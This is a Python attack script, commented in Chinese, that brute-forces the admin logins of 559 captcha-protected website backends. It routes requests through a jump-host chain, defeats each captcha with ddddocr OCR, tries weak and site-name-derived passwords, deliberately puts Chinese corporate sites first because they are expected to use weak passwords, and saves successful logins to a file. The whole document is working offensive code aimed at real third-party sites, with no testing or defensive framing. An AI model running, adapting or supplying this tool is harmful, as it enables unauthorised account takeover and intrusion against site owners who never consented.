#!/usr/bin/env python3
"""captcha_bf_batch.py - 559个验证码后台OCR爆破(81.70跳板链)
流程: 81.70下载验证码 -> 165 ddddocr识别 -> 81.70提交登录
先打国产企业站(ah/aq/anbang等, 弱口令命中率高)
判定: 登录后含logout/退出/管理 且不含password字段 = 成功
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
HOST = 'http://127.0.0.1:13080'

# 密码表(含站名变体+拼音+常见)
PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "123456789", "1qaz2wsx", "qwe123"]

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(40000)
    except Exception:
        return b''

def get_cap(dom):
    """通过81.70下载验证码(多路径尝试)"""
    for cap_url in [HOST + '/getcap2.php?d=' + urllib.parse.quote(dom),
                    HOST + '/getcap_sz.php?d=' + urllib.parse.quote(dom)]:
        out = fetch(cap_url)
        if b'SAVED:' in out:
            # 拉图片
            img_url = HOST + ('/ys_cap2.jpg' if 'getcap2' in cap_url else '/sz_cap.jpg')
            try:
                r = urllib.request.urlopen(urllib.request.Request(img_url, headers=UA), timeout=15, context=ctx)
                img = r.read()
                if img and len(img) > 50:
                    return img, cap_url
            except Exception:
                pass
    return None, None

def do_login(dom, pw, code, cap_type):
    if 'getcap2' in cap_type:
        url = HOST + '/loginpost2.php?d=' + urllib.parse.quote(dom) + '&p=' + urllib.parse.quote(pw) + '&c=' + code
    else:
        url = HOST + '/login_sz.php?d=' + urllib.parse.quote(dom) + '&u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code
    out = fetch(url)
    idx = out.find(b'GIF89a')
    body = out[idx+6:] if idx > 0 else out
    try:
        return body.decode('gb2312', 'ignore')
    except Exception:
        return ''

def try_pw(dom, path, pw):
    """单密码尝试(验证码OCR+登录), 返回 True=命中"""
    img, cap_type = get_cap(dom)
    if not img:
        return 'capfail'
    try:
        c1 = ocr.classification(img)
        im = Image.open(io.BytesIO(img)).convert('L')
        im = im.resize((im.width * 4, im.height * 4), Image.LANCZOS)
        im = im.point(lambda p: 255 if p > 120 else 0)
        buf = io.BytesIO(); im.save(buf, 'PNG')
        c2 = ocrb.classification(buf.getvalue())
    except Exception:
        return 'ocrfail'
    code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
    resp = do_login(dom, pw, code, cap_type)
    low = resp.lower()
    # 验证码错
    if '验证码' in resp or '确认码' in resp or '不一致' in resp or '楠璇' in resp:
        return 'capwrong'
    # 登录失败
    if '错误' in resp or '失败' in resp or '密码' in resp or '不正确' in resp or '不存在' in resp:
        return 'pwfail'
    # 成功: 无password字段+有后台特征
    has_pw = 'password' in low or 'type="password"' in low
    has_admin = 'logout' in low or '退出' in resp or '管理' in resp or '欢迎' in resp
    if not has_pw and has_admin and len(resp) > 300:
        return 'HIT'
    return 'unknown:%s' % resp[:60].replace(chr(10), ' ')

def process(entry):
    dom, path = entry.strip().split()
    # 每站只试top密码(站名+5个通用), 提高速度
    base = dom.split('.')[0].replace('www', '')
    pwlist = [base, base+'123', 'admin', 'admin123', '123456', 'admin888', '12345678', 'password']
    for pw in pwlist:
        for attempt in range(3):
            r = try_pw(dom, path, pw)
            if r == 'capfail' or r == 'ocrfail':
                time.sleep(1)
                continue
            if r == 'capwrong':
                continue
            if r == 'HIT':
                print('!!! HIT: %s %s admin/%s' % (dom, path, pw), flush=True)
                return (dom, 'admin', pw, path)
            break  # pwfail 或 unknown 换密码
    return None

def main():
    entries = open('/tmp/captcha_backends.txt').read().strip().split('\n')
    # 国产企业站优先(ah/aq/feng/anbang等)
    cn_entries = [e for e in entries if re.search(r'\b(ah|aq|anbang|huaxia|feng|gx|jx)\w*\.(com|cn)', e.split()[0])]
    rest = [e for e in entries if e not in cn_entries]
    todo = cn_entries + rest
    print('captcha backends: %d (cn优先 %d)' % (len(todo), len(cn_entries)), flush=True)
    hits = []
    with ThreadPoolExecutor(max_workers=6) as ex:
        futs = {ex.submit(process, e): e for e in todo}
        for i, fu in enumerate(as_completed(futs)):
            r = fu.result()
            if r:
                hits.append(r)
            if (i+1) % 10 == 0:
                print('progress: %d/%d hits=%d' % (i+1, len(todo), len(hits)), flush=True)
    with open('/tmp/captcha_bf_hits.txt', 'w') as f:
        for h in hits:
            f.write('\t'.join(h) + '\n')
    print('=== DONE: %d hits ===' % len(hits), flush=True)

if __name__ == '__main__':
    main()
